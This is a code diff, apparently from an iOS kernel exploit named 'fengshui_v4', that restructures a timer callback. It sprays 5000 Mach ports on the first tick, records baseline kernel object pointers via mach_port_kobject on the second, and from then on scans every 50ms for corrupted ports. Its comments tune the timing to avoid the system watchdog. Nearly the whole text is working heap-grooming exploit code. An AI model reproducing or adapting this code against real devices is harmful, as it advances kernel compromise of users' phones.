@@ -164,11 +164,16 @@ extern void *kCFRunLoopDefaultMode;
 extern double CFAbsoluteTimeGetCurrent(void);
 extern void CFRunLoopRun(void);
 
+static int g_baseline_done = 0;  /* set after mach_port_kobject baseline pass */
+
 static void timer_cb(CFRunLoopTimerRef t, void *info) {
     g_tick++;
 
     if (g_tick == 1) {
-        /* Phase 1: allocate 5000 ipc_ports */
+        /* Tick 1: ONLY allocate ports (fast — matches v3 timing, avoids 0x8BADF00D watchdog).
+         * NO mach_port_kobject calls here — that's done on tick 2.
+         * 5000 x (mach_port_allocate + mach_port_insert_right) ≈ 300ms = safe.
+         */
         mach_port_t task = mach_task_self();
         for (int i = 0; i < NUM_PORTS; i++) {
             mach_port_t p = MACH_PORT_NULL;
@@ -178,23 +183,36 @@ static void timer_cb(CFRunLoopTimerRef t, void *info) {
                 mach_port_deallocate(task, p);
                 break;
             }
-            g_ports[g_count] = p;
-            /* Record baseline kobject/kotype */
-            mach_port_kobject(task, p, &g_base_kotype[g_count], &g_base_kobject[g_count]);
-            g_count++;
+            g_ports[g_count++] = p;
         }
-
         char status[128];
         int sn = snprintf(status, sizeof(status),
-            "READY ports=%d tick=1 scanning@50ms\n", g_count);
+            "PORTS_ALLOCATED ports=%d tick=1\n", g_count);
         dcim_write("fengshui_v4_status", status, sn);
         write(STDERR_FILENO, status, sn);
 
-    } else if (g_count > 0) {
-        /* Every 50ms: scan for corruption — keep scanning even after first find */
+    } else if (g_tick == 2 && g_count > 0) {
+        /* Tick 2: baseline scan — record kotype+kobject for all ports.
+         * 5000 x mach_port_kobject ≈ 500ms (one tick behind allocation = safe).
+         */
+        mach_port_t task = mach_task_self();
+        for (int i = 0; i < g_count; i++) {
+            g_base_kotype[i]  = 0;
+            g_base_kobject[i] = 0;
+            mach_port_kobject(task, g_ports[i], &g_base_kotype[i], &g_base_kobject[i]);
+        }
+        g_baseline_done = 1;
+        char status[128];
+        int sn = snprintf(status, sizeof(status),
+            "READY ports=%d baseline_done tick=2 scanning@50ms\n", g_count);
+        dcim_write("fengshui_v4_status", status, sn);
+        write(STDERR_FILENO, status, sn);
+
+    } else if (g_baseline_done && g_count > 0) {
+        /* Tick 3+: scan for corruption every 50ms */
         scan_ports();
 
-        /* Periodic alive ping every 10s (200 ticks × 50ms) */
+        /* Alive ping every 10s */
         if (g_tick % 200 == 0) {
             char ping[64];
             int pn = snprintf(ping, sizeof(ping),
